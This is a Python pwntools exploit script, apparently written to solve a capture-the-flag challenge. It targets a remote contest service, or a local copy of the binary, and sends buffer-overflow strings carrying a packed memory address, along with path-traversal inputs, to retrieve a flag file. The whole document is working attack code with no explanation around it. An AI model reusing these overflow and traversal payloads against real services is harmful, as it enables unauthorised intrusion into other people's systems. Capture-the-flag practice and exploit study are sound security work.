from pwn import *

ADDR_TO_OVERWRITE = p64(0x601f1f)

def exploit1():
	p = process('./launch public/', shell=True)
	raw_input()

	log.info('start')
	p.sendline('get')
	p.sendline('../' + 'A'*8190)
	p.sendline('A'*8191 + ADDR_TO_OVERWRITE)
	p.sendline('language')
	p.sendline('L'*(2**12-1))
	return p

def exploit():
	# p = process('./launch public/', shell=True)
	p = remote('cthulhu.fluxfingers.net', 1509)

	log.info('start')
	
	p.sendline('language')
	p.sendline('A'*8)

	p.sendline('language')
	p.sendline('A'*(2**12 + 5))

	# overflowing
	p.sendline('A'*(8191 + 8192) + ADDR_TO_OVERWRITE)

	p.sendline('language')
	p.sendline('A'*8)

	# overflowing
	p.sendline('A'*(8191 + 8192) + '\x05')

	p.sendline('language')
	p.sendline('\x11')

	p.sendline('get')
	p.sendline('///////////////////////flag')
	p.interactive()
	return p